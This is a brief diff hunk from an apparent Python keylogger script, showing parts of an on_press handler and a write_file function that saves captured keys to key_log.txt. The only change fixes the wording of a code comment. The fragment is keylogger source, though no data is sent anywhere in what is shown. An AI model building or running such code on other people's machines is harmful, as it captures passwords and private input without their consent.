@@ -28,7 +28,7 @@ def on_press(key):
     keys = []
 
 #write to a file
-#text file be named how you see fit
+#text file can be named how you see fit
 def write_file(key):
   with open("key_log.txt", "w") as f:
     for key in keys:
